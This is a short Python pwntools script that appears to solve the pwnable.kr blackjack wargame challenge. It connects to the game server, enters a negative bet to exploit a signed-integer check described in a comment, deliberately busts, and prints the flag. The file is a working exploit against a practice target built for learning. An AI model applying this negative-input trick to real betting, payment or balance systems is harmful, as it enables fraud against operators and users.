from pwn import *

r = remote('pwnable.kr', 9009)
r.recvuntil('Are You Ready?')
r.sendline('y')

r.recvuntil('Choice: ')
r.sendline('1')

r.recvuntil('Your Total is ')
total = int(r.recvline(False))

# Bug is that cash and bet are both signed. Game disallows bet > cash but
# allows negative betting.
r.recvuntil('Enter Bet: $')
r.sendline('-1000000')

# Hit until we bust.
while total < 21:
  r.sendline('h')
  r.recvuntil('Your Total is ')
  total = int(r.recvline(False))

# Check to see if we accidentally won the game.
if total == 21:
  r.recvuntil('The Dealer Has a Total of ')
  dealers_total = int(r.recvline(False))
  if total > dealers_total:
    log.error('We actually won :(')

# We don't get the flag until we start a new hand.
r.sendline('y')
r.recvuntil('1;1H') # Game sends a clr sequence just before the flag.
print(r.recvline())
